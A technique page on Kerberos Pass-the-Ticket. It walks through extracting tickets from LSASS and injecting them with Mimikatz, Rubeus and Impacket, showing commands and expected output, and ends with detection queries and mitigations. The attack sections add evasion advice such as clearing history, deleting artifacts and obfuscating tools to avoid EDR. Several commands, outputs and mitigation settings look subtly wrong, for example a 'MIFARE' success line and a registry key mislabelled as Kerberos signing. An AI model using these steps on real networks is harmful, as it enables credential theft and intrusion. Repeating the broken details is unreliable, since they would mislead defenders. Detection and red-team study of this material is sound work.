# [LM-AUTH-002]: Pass-the-Ticket (PTT)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-002 |
| **MITRE ATT&CK v18.1** | [T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Windows AD, Windows Endpoint |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Server 2016 - 2025, Windows 10/11 |
| **Patched In** | Not patched (design feature) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Pass-the-Ticket (PtT) is an adversarial technique that leverages stolen Kerberos Ticket Granting Tickets (TGT) or Service Tickets (TGS) to authenticate to Windows resources without requiring the plaintext password or hash of the compromised user. Once extracted from a compromised system's memory (via tools like Mimikatz), a valid Kerberos ticket can be replayed on the same machine or moved laterally to other systems where it's injected into the attacker's logon session. The Kerberos protocol validates the ticket's signature and expiration but does not perform additional checks to verify that the ticket owner is the same entity using it. This design flaw enables attackers to impersonate legitimate users for extended periods.

**Attack Surface:** LSASS process memory (where tickets are cached), Kerberos credential cache, Ticket Granting Service request/response traffic.

**Business Impact:** **Complete bypass of authentication controls and lateral movement infrastructure.** An attacker with a stolen TGT can access any Kerberos-protected resource (file shares, domain controllers, printers, SQL databases) with the same privileges as the compromised user, for the lifetime of the ticket (typically 8-24 hours). This enables data exfiltration, privilege escalation, ransomware deployment, and persistence without credential modification.

**Technical Context:** Extraction via tools like Mimikatz on a compromised endpoint is nearly immediate (seconds). Detection is moderate—Event ID 4769 (TGS request) will fire, but legitimate users also generate this event continuously. Tickets have a finite lifetime; attackers must time usage carefully or repeatedly extract new ones.

### Operational Risk
- **Execution Risk:** Low - Ticket extraction and injection use well-known, reliable techniques with low failure rates.
- **Stealth:** Medium - Generates Event ID 4769 and 4768 logs; easily detected if monitoring is enabled. However, legitimate traffic provides excellent cover.
- **Reversibility:** Irreversible until ticket expiration (typically 8-24 hours). Invalidating all TGTs requires a krbtgt password reset.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1, 4.6 | Failure to restrict Kerberos delegation and audit Kerberos authentication events. |
| **DISA STIG** | Windows_Server-DC-2.3-GRP | Audit Kerberos TGT and TGS requests and failures. |
| **CISA SCuBA** | AUTH-02 | Implementing strong authentication without reliance on Kerberos ticket lifetime alone. |
| **NIST 800-53** | AC-2, AC-3, AU-6 | Account management, access control enforcement, audit review. |
| **GDPR** | Art. 32 | Security of processing – inadequate monitoring and audit controls. |
| **DORA** | Art. 9 | Protection and prevention – compromised authentication mechanisms. |
| **NIS2** | Art. 21 | Cyber risk management – authentication and access control measures. |
| **ISO 27001** | A.9.2.3, A.12.4 | Management of privileged access rights, logging and monitoring. |
| **ISO 27005** | Risk: Unauthorized access to critical systems via stolen credentials. | |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **For ticket extraction:** Local Administrator (if not logged-in interactively) or credentials of the user whose ticket is being stolen.
  - **For ticket injection:** Local Administrator or user context with access to LSA (Local Security Authority).
  
- **Required Access:** 
  - Network access to a compromised endpoint or domain-joined machine.
  - Ability to execute code with sufficient privileges (via exploitation, admin compromise, or service account abuse).

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025, Windows 10 (all versions), Windows 11 (all versions)
- **PowerShell:** Version 5.0+ (native to Windows)
- **Other Requirements:** 
  - Kerberos authentication enabled (default in AD environments)
  - Not compatible with Entra ID-only (cloud-only) environments without hybrid AD Connect

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 1.6.0+)
- [Impacket](https://github.com/fortra/impacket) (Version 0.10.1+) – Linux/cross-platform alternative
- [PowerShell Kerberos Module](https://learn.microsoft.com/en-us/powershell/module/addsextended/get-aduser) (native)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

Check if Kerberos authentication is active and if the current user has cached tickets:

```powershell
# List all Kerberos tickets in current session
klist

# Detailed ticket information (Windows 10/11, Server 2019+)
klist /all

# Check current user's ticket age and expiration
Get-Process lsass | Select-Object Name, Id, Handles

# Verify domain connectivity
nltest /dsgetdc:DOMAIN.local
```

**What to Look For:**
- Output from `klist` showing TGT and/or TGS tickets (e.g., "Ticket Granting Ticket" and "Service Tickets").
- Ticket with an expiration time far in the future (success indicator).
- If `klist` returns "No tickets present in the cache," Kerberos is not actively used (rare in AD environments).

**Version Note:** 
- **Windows Server 2016-2019:** `klist` output is basic; use `mimikatz.exe "kerberos::list"` for detailed info.
- **Windows Server 2022+:** `klist /all` provides more detailed output including ticket flags.

### Linux/Bash / CLI Reconnaissance

For Linux endpoints joined to AD via SSSD or Kerberos:

```bash
# List cached Kerberos tickets (Linux/Unix with krb5)
klist

# Check if Kerberos is configured
cat /etc/krb5.conf

# List all tickets with timestamps
klist -A

# Check CCACHE location
echo $KRB5CCNAME
```

**What to Look For:**
- Presence of cached tickets in `/tmp/krb5cc_*` or location specified by `KRB5CCNAME`.
- Tickets for specific SPNs (cifs, ldap, etc.).

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Using Mimikatz (Windows - Interactive)

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Obtain Elevated Access

**Objective:** Gain Local Administrator privileges on the target endpoint.

**Prerequisite:** Must be running as SYSTEM, LOCAL SYSTEM, or a user with SeDebugPrivilege.

**Command:**

```powershell
# Verify current privileges
whoami /priv | findstr /I "sedebuggprivilege"

# If insufficient privileges, attempt UAC bypass (Server 2016-2019)
# Using Fodhelper (Windows 10/11, Server 2019+)
# Or request elevation: Right-click PowerShell -> Run as Administrator
```

**Expected Output:**
```
SeDebugPrivilege                    Enabled
```

**What This Means:**
- If `SeDebugPrivilege` is `Enabled`, you can read LSASS memory.
- If listed but `Disabled`, request UAC elevation or switch to a privileged user.

**OpSec & Evasion:**
- Avoid verbose tools; use silent execution with `-NoProfile -WindowStyle Hidden`.
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`.
- Run from a temp directory to avoid logging in audit paths.
- Detection likelihood: **High** – Event ID 4688 logs Mimikatz execution; Event ID 4648 logs privilege request.

#### Step 2: Extract Kerberos Tickets with Mimikatz

**Objective:** Dump all Kerberos tickets cached in LSASS memory.

**Command (Standard):**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

**Command (PowerShell variant):**

```powershell
. C:\Tools\mimikatz\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command "privilege::debug `"sekurlsa::tickets /export`""
```

**Command (In-Memory - No Disk Touch):**

```powershell
# Using Rubeus with in-memory ticket dump
$MimikatzPath = "C:\Temp\mimikatz.exe"
& $MimikatzPath "privilege::debug" "sekurlsa::tickets /export" "kerberos::list" "exit"
```

**Expected Output:**

```
mimikatz(powershell) # privilege::debug
[00000000] Token elevation result (20)
mimikatz(powershell) # sekurlsa::tickets /export
[00] - 0x0       -> Kerberos ticket file
 * Saved to file [0] : 10_40-46147_krbtgt~DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
 * Saved to file [1] : 10_40-46149_user@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
 * Saved to file [2] : 10_40-46150_cifs~dc01~DOMAIN.LOCAL@DOMAIN.LOCAL_DOMAIN.LOCAL.kirbi
```

**What This Means:**
- Each `.kirbi` file is an exported Kerberos ticket.
- Files named `*_krbtgt*` are TGTs (Ticket Granting Tickets) – most valuable.
- Files named `*_cifs*`, `*_ldap*`, etc., are Service Tickets for specific resources.

**OpSec & Evasion:**
- Delete exported tickets after injection: `Remove-Item *.kirbi`.
- Use `/export` flag to avoid keeping tickets in memory longer than necessary.
- Run from a non-default location (e.g., `C:\ProgramData\` instead of `C:\Temp\`).
- Detection likelihood: **Very High** – LSASS access is heavily monitored; Microsoft Defender will likely alert.

**Troubleshooting:**

- **Error:** `"mimikatz.exe" is not recognized`
  - **Cause:** Mimikatz path is not in PATH environment variable or file doesn't exist.
  - **Fix (All Versions):** Specify full path: `"C:\Tools\mimikatz.exe"` or add to PATH.

- **Error:** `Privilege::Debug - ERROR kuhl_m_privilege_simple ; (Opaque)`
  - **Cause:** Current user does not have SeDebugPrivilege or UAC is blocking elevation.
  - **Fix (Server 2016-2019):** Run as Administrator (`runas /user:DOMAIN\AdminAccount cmd.exe`).
  - **Fix (Server 2022+):** Same as above; UAC still applies.
  - **Fix (Windows 11):** Disable User Account Control (not recommended) or use System context.

- **Error:** `sekurlsa::tickets - no ticket`
  - **Cause:** Current user has no cached tickets, or Kerberos is not in use.
  - **Fix:** First authenticate to a resource (`net use \\dc01\netlogon`), then re-run.

#### Step 3: Inject Tickets into Current Session

**Objective:** Load the exported ticket into the current user's Kerberos cache, allowing access to resources as the compromised user.

**Command (Mimikatz - TTL Mode):**

```cmd
mimikatz.exe "privilege::debug" "kerberos::ptt [0_40-46151_USER@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi]" "exit"
```

Replace `[...]` with the filename of the exported TGT or service ticket.

**Command (Mimikatz - Base64 Encoded TTL):**

```powershell
$ticket = Get-Content -Path "10_40-46151_USER@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi" -Encoding Byte
[System.Convert]::ToBase64String($ticket) | Out-File -FilePath "ticket.b64"
mimikatz.exe "privilege::debug" "kerberos::ptt::base64 ticket.b64" "exit"
```

**Command (Using Rubeus - Recommended):**

```cmd
rubeus.exe ptt /ticket:0_40-46151_USER@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
```

**Expected Output (Mimikatz):**

```
mimikatz(powershell) # kerberos::ptt [0_40-46151_USER@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi]
* File: [0_40-46151_USER@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi]
 * [0] - 0x0     -> Kerberos ticket file

MIFARE - OK/SUCCES
```

**Expected Output (Rubeus):**

```
Rubeus 1.6.4 (build 30b56dff) - Kerberos relaying/interoperability tool

[*] Action: Pass The Ticket (PTT)
[+] Ticket successfully imported!
```

**What This Means:**
- Ticket is now loaded into the attacker's session under the context of the compromised user.
- All Kerberos-authenticated requests will use this ticket without requiring a password.
- The attacker can now access resources as if they were the compromised user.

**OpSec & Evasion:**
- Perform ticket injection immediately after extraction to minimize detection window.
- Use Rubeus over Mimikatz (slightly quieter in some EDR solutions).
- Clear Kerberos ticket cache after use: `klist purge`.
- Detection likelihood: **Medium-High** – Ticket injection itself is hard to detect, but subsequent resource access may be anomalous.

**Troubleshooting:**

- **Error:** `Kerberos::ptt - ERROR kuhl_m_kerberos_ptt`
  - **Cause:** Ticket file is corrupted, or file path contains spaces without quotes.
  - **Fix:** Use quotes around full path: `"C:\path with spaces\ticket.kirbi"`.

- **Error:** `Authentication failure - ERROR`
  - **Cause:** Ticket has expired or is invalid.
  - **Fix:** Re-extract a fresh ticket from the compromised machine.

#### Step 4: Verify Ticket Injection

**Objective:** Confirm the injected ticket is usable.

**Command:**

```powershell
# List injected tickets
klist

# Attempt access to a resource using the injected identity
net use \\dc01\netlogon

# Or access a file share
Get-ChildItem \\dc01\c$\Windows\System32
```

**Expected Output:**

```
New connections will be made using the user name '<DOMAIN>\<COMPROMISED_USER>'.

The command completed successfully.
```

or

```
Directory: \\dc01\c$\Windows\System32

Mode                 LastWriteTime         Length Name
----                 -----------           ------ ----
d-----         1/9/2025 8:30 AM                  drivers
d-----         1/9/2025 8:30 AM                  spool
```

**What This Means:**
- Ticket injection succeeded and is now active.
- Attacker can access resources as the compromised user.

**References & Proofs:**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [MITRE ATT&CK T1550.003](https://attack.mitre.org/techniques/T1550/003/)
- [SpecterOps - Kerberos Attacks](https://specterops.io/blog/kerberos-attacks)

---

### METHOD 2: Using Rubeus (Windows - Silent & Stealth)

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Compile or Acquire Rubeus

**Objective:** Obtain a working copy of Rubeus binary.

**Download:**

```powershell
# Clone from GitHub
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
dotnet build -c Release

# Binary output: .\Rubeus\bin\Release\net48\Rubeus.exe
```

**Or Use Pre-compiled:**

```powershell
# Download pre-built from releases
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.4/Rubeus.exe" -OutFile "Rubeus.exe"
```

**Expected Output:**

```
Rubeus 1.6.4 (build 30b56dff) - Kerberos relaying/interoperability tool
```

**What This Means:**
- Rubeus is ready for use.

#### Step 2: Dump Kerberos Tickets (Rubeus)

**Objective:** Extract cached Kerberos tickets more quietly than Mimikatz.

**Command (List tickets):**

```powershell
Rubeus.exe triage
```

**Command (Dump specific user tickets):**

```powershell
Rubeus.exe dump /user:domain\admin
```

**Command (Dump TGT + auto-inject with /ptt):**

```powershell
Rubeus.exe dump /user:domain\admin /ptt
```

**Expected Output:**

```
Rubeus 1.6.4 (build 30b56dff)

[*] Dumping current Kerberos session tickets

User: DOMAIN.LOCAL\ADMIN
ServiceName: krbtgt/DOMAIN.LOCAL
Ticket: <base64-ticket-blob>

[+] Ticket successfully imported!
```

**What This Means:**
- TGT extracted and injected in a single command.
- No intermediate files written to disk (unless `/export` is used).

**OpSec & Evasion:**
- Rubeus is recognized by Windows Defender and EDR; consider obfuscation or compilation with custom keywords.
- The `/ptt` flag performs in-memory injection without disk artifacts.
- Detection likelihood: **High** – LSASS access is monitored; binary name `Rubeus.exe` is a known indicator.

#### Step 3: Pass-the-Ticket with Rubeus

**Objective:** Inject the dumped ticket into the attacker's session.

**Command (Explicit file-based injection):**

```powershell
Rubeus.exe ptt /ticket:<base64-ticket-blob>
```

or

```powershell
Rubeus.exe ptt /ticket:C:\path\to\exported.kirbi
```

**Expected Output:**

```
Rubeus 1.6.4 (build 30b56dff)

[*] Action: Pass The Ticket (PTT)
[+] Ticket successfully imported!
```

**What This Means:**
- Ticket is now active in the attacker's Kerberos credential cache.
- Access to resources as the compromised user is now possible.

**References & Proofs:**
- [Rubeus GitHub - Documentation](https://github.com/GhostPack/Rubeus/wiki)
- [GhostPack - Kerberos Toolset](https://posts.specterops.io/kerberoasting-with-rubeus-7fcb9e8e4b1e)

---

### METHOD 3: Using Impacket (Linux/Cross-Platform)

**Supported Versions:** Works with Windows AD from Linux attacker machine.

#### Step 1: Install Impacket

**Objective:** Set up Impacket framework on Linux attacker system.

**Command:**

```bash
pip install impacket
# Or from source
git clone https://github.com/fortra/impacket.git
cd impacket
pip install -r requirements.txt
python setup.py install
```

**Expected Output:**

```
Successfully installed impacket-0.10.1
```

#### Step 2: Extract Tickets via LDAP Enumeration

**Objective:** Use Impacket to query AD and extract ticket info.

**Command (getLAPSPasswords.py for LAPS-protected passwords):**

```bash
python getLAPSPasswords.py -username 'domain\user' -password 'password' -dc-ip 192.168.1.10 domain.local/admin
```

**Command (More direct: secretsdump for ticket extraction from DC):**

```bash
python secretsdump.py domain.local/admin:password@192.168.1.10
```

**Expected Output:**

```
[*] Dumping domain info for first time
[*] Domain Name: DOMAIN.LOCAL
[*] Cached credentials (domain\username:hash)
Domain\admin:aad3b435b51404eeaad3b435b51404ee:...
```

#### Step 3: Use Extracted Credentials for Lateral Movement

**Objective:** Leverage extracted credentials to request Kerberos tickets.

**Command (Get TGT via Kerberos from Linux):**

```bash
getTGT.py -dc-ip 192.168.1.10 'domain.local/admin:password'
```

**Expected Output:**

```
Impacket v0.10.1

[*] Saving ticket in admin.ccache
```

#### Step 4: Use Ticket for Access

**Objective:** Use the cached ticket to authenticate to Windows resources.

**Command (Export to Kerberos ticket location):**

```bash
export KRB5CCNAME=/root/admin.ccache

# Use with psexec or other tools
psexec.py -k -no-pass 'domain.local/admin@192.168.1.10'
```

**Expected Output:**

```
Impacket v0.10.1
[*] Requesting shares on 192.168.1.10...
C$                                                  READ, WRITE
```

**What This Means:**
- Attacker now has remote code execution as the compromised user.

**References & Proofs:**
- [Impacket Documentation](https://github.com/fortra/impacket/wiki)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1550.003
- **Test Name:** Kerberos Ticket Injection (Pass-the-Ticket)
- **Description:** Simulates extraction and injection of a Kerberos TGT to authenticate as another user without their password.
- **Supported Versions:** Server 2016+, Windows 10/11

**Command:**

```powershell
Invoke-AtomicTest T1550.003 -TestNumbers 1
```

**Cleanup Command:**

```powershell
Invoke-AtomicTest T1550.003 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team Library - T1550.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.md)

---

## 6. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+
**Minimum Version:** 2.1.1
**Supported Platforms:** Windows (all versions)

**Version-Specific Notes:**
- Version 2.1.x: Basic ticket extraction; no base64 encoding.
- Version 2.2.0+: Full feature set including base64 ticket encoding.
- Version 2.2.4+: Improved DPAPI key handling and ticket caching.

**Installation:**

```powershell
# Download from GitHub
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230302/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile mimikatz.zip
Expand-Archive -Path mimikatz.zip -DestinationPath C:\Tools\mimikatz
```

**Usage (Extract & Inject):**

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
kerberos::ptt [ticket.kirbi]
exit
```

**One-Liner Script:**

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "kerberos::ptt [0_40-46151_USER@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi]" "exit" | Out-Null; klist
```

---

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+
**Minimum Version:** 1.5.0
**Supported Platforms:** Windows (all versions), requires .NET Framework 4.8+

**Version-Specific Notes:**
- Version 1.5.x: Basic PTT support; some LSASS parsing issues.
- Version 1.6.0+: Improved Kerberos parsing, silent mode support.
- Version 1.6.4+: Multiple ticket injection, OPSEC improvements.

**Installation:**

```powershell
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
dotnet build -c Release
```

**Usage (Dump & Inject):**

```powershell
Rubeus.exe dump /ptt
```

---

### [Impacket](https://github.com/fortra/impacket)

**Version:** 0.10.1+
**Minimum Version:** 0.9.24
**Supported Platforms:** Linux, macOS, Windows (via Python)

**Installation (Linux):**

```bash
pip install impacket
```

**Usage (Get TGT from Linux):**

```bash
python getTGT.py -dc-ip 192.168.1.10 domain.local/user:password
export KRB5CCNAME=user.ccache
python psexec.py -k -no-pass domain.local/user@target.domain.local
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Kerberos TGT Injection via Ticket Granting Service Request

**Rule Configuration:**
- **Required Index:** main, windows
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, Account_Name, Service_Name, Ticket_Options, Client_Address
- **Alert Threshold:** > 3 TGS requests (EventID 4769) from the same Account_Name for different Service_Name values within 5 minutes
- **Applies To Versions:** Server 2016+

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4769 OR EventCode=4768
| stats count by Account_Name, Service_Name, dest, src
| where count > 3
| table _time, Account_Name, Service_Name, dest, src, count
```

**What This Detects:**
- Multiple TGS requests from the same account in rapid succession (suspicious pattern).
- Requests originating from unexpected source IP addresses.
- Service ticket requests for sensitive services (krbtgt, ldap, cifs) by low-privilege accounts.

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Name: `Kerberos PTT - Multiple TGS Requests`
5. Paste the SPL query above
6. **Trigger Condition:** `Alert when number of events > 3`
7. **Time Range:** Last 5 minutes
8. Configure **Action** → Send email to SOC

**Source:** [Splunk Kerberos Analytics](https://github.com/splunk/security_content/blob/develop/detections/endpoint/kerberos_ticket_injection.yml)

### Rule 2: LSASS Memory Access via Mimikatz/Rubeus

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Sysmon or WinEventLog:Security
- **Required Fields:** SourceImage, TargetImage, GrantedAccess, API
- **Alert Threshold:** > 1 instance of mimikatz.exe or Rubeus.exe accessing lsass.exe
- **Applies To Versions:** Server 2016+

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Sysmon" EventCode=10
SourceImage IN (mimikatz.exe, Rubeus.exe)
TargetImage="C:\\Windows\\System32\\lsass.exe"
| stats count by SourceImage, TargetImage, GrantedAccess, _time
```

**What This Detects:**
- Known Kerberos attack tools accessing sensitive LSASS process.
- Unauthorized memory access patterns.

**Manual Configuration Steps:**
1. Enable Sysmon on all domain-joined machines
2. Import Sysmon configuration with memory access rules
3. Create Splunk alert as above

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Pass-the-Ticket - Kerberos TGS Injection Pattern

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, TargetUserName, Computer, IpAddress
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Server 2016+

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4769
| where ResultCode == "0x0"
| summarize TGSCount = count() by TargetUserName, Computer, IpAddress, bin(TimeGenerated, 5m)
| where TGSCount > 5
| project TimeGenerated, TargetUserName, Computer, IpAddress, TGSCount
```

**What This Detects:**
- Multiple Service Ticket (TGS) requests within a 5-minute window (Pass-the-Ticket behavior).
- Unusual spike in ticket requests for sensitive services.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Kerberos Pass-the-Ticket - Multiple TGS Requests`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Success) – A Kerberos Ticket Granting Service (TGS) was requested**
- **Log Source:** Security
- **Trigger:** Every time a user requests a service ticket
- **Filter:** Alert on tickets with Result Code = 0x0 (success) for sensitive services (krbtgt, cifs, ldap, host)
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Audit Policies** → **Account Logon**
4. Enable: **Audit Kerberos Service Ticket Operations** (set to **Success and Failure**)
5. Also enable: **Audit Kerberos Authentication Service** (set to **Success and Failure**)
6. Run `gpupdate /force` on target machines
7. Restart affected machines or wait for next group policy refresh

**Manual Configuration Steps (Server 2022+):**
Same as Server 2016-2019; Group Policy is identical.

**Manual Configuration Steps (Local Policy – Single Machine):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations** (set to **Success and Failure**)
4. Apply changes
5. Run `auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Server 2016+

```xml
<EventFiltering>
  <!-- Detect Mimikatz/Rubeus LSASS Access -->
  <RuleGroup name="" groupRelation="or">
    <ProcessAccess onmatch="include">
      <!-- Detect process access to LSASS -->
      <TargetImage condition="image">lsass.exe</TargetImage>
      <GrantedAccess condition="is">0x1410</GrantedAccess>
      <GrantedAccess condition="is">0x1400</GrantedAccess>
      <GrantedAccess condition="is">0x0430</GrantedAccess>
    </ProcessAccess>
  </RuleGroup>
  
  <!-- Detect Kerberos Ticket Export Files -->
  <RuleGroup name="" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">.kirbi</TargetFilename>
      <TargetFilename condition="contains">ticket</TargetFilename>
    </FileCreate>
  </RuleGroup>
</EventFiltering>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create/download a sysmon-config.xml file with the XML rules above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Select-Object Id, Message
   ```
5. Monitor for Event ID 10 (ProcessAccess) and Event ID 11 (FileCreate) in the Sysmon operational log

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Kerberos Activity

**Alert Name:** "Suspicious Kerberos activity detected"
- **Severity:** High
- **Description:** Detects unusual patterns in Kerberos authentication, including multiple TGS requests from a single source in short time windows.
- **Applies To:** Servers with Microsoft Defender for Cloud enabled
- **Remediation:** 
  1. Isolate the affected server from the network.
  2. Review process execution logs for known attack tools (Mimikatz, Rubeus).
  3. Reset compromised user passwords and invalidate all sessions.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON (for on-premises AD monitoring)
5. Click **Save**
6. Go to **Security alerts** → Set filter to show alerts from the last 24 hours
7. Configure **Email notifications** → enter SOC email address

**Reference:** [Microsoft Defender for Cloud - Kerberos Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enforce Kerberos Signing & Sealing:**
    **Applies To Versions:** Server 2016+
    
    Force all Kerberos traffic to be signed and sealed to prevent ticket replay attacks.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
    3. Locate: **Network security: Require sign-in or seal (Kerberos)**
    4. Set to: **Signing and Sealing Required**
    5. Run `gpupdate /force` on all machines

    **Manual Steps (Server 2022+):**
    Same as above; setting applies uniformly.

    **Manual Steps (PowerShell):**
    ```powershell
    # Set registry key to require Kerberos signing
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "SignSecureChannel" -Value 1 -PropertyType DWORD -Force
    Restart-Computer -Force
    ```

*   **Enable Kerberos Armoring (FAST):**
    **Applies To Versions:** Server 2012 R2+
    
    Implement Flexible Authentication Secure Tunneling to protect Kerberos messages.
    
    **Manual Steps (Group Policy):**
    1. **Computer Configuration** → **Administrative Templates** → **System** → **Kerberos**
    2. Enable: **Support Dynamic Object Identification Numbers (OIDs)**
    3. Enable: **KDC support for claims, compound authentication, and Kerberos armoring**
    4. Set to: **Supported**
    5. Apply via `gpupdate /force`

*   **Reduce Kerberos Ticket Lifetime:**
    Shorter ticket lifetimes limit the window for ticket theft exploitation.
    
    **Manual Steps (Group Policy):**
    1. **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Kerberos Policy**
    2. Modify: **Maximum ticket lifetime** (default 600 minutes)
    3. Set to: **60 minutes** (recommended for high-security environments)
    4. Modify: **Maximum user ticket renewal lifetime**
    5. Set to: **600 minutes**
    6. Run `gpupdate /force`

### Priority 2: HIGH

*   **Restrict Local Administrator Access:**
    Limit the number of accounts with Local Admin privileges to prevent LSASS memory access.
    
    **Manual Steps:**
    1. Open **Lusrmgr.msc** (Local Users and Groups)
    2. Navigate to **Groups** → **Administrators**
    3. Remove unnecessary members; keep only service accounts required for operations
    4. Document remaining admins in change management system

*   **Enable LSA Protection (RunAsPPL):**
    Protect LSASS process from unauthorized access.
    
    **Manual Steps (Server 2016-2019):**
    1. Open Registry Editor (regedit.exe)
    2. Navigate to: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
    3. Create new DWORD: `RunAsPPL` and set to `1`
    4. Restart the server

    **Manual Steps (Server 2022+):**
    Same as above, but also consider enabling **Windows Defender Credential Guard** via Group Policy:
    - **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
    - Enable: **Turn On Virtualization Based Security** (requires UEFI firmware support)

*   **Monitor and Alert on LSASS Access:**
    Enable detailed audit logging for process access to LSASS.
    
    **Manual Steps:**
    1. Deploy Sysmon to all machines (see Section 10)
    2. Configure audit rules for Event ID 10 (ProcessAccess) targeting lsass.exe
    3. Forward Sysmon logs to SIEM (Splunk, Sentinel, etc.)

### Priority 3: MEDIUM

*   **Implement Conditional Access Policies (Entra ID Hybrid Only):**
    Require device compliance for authentication.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
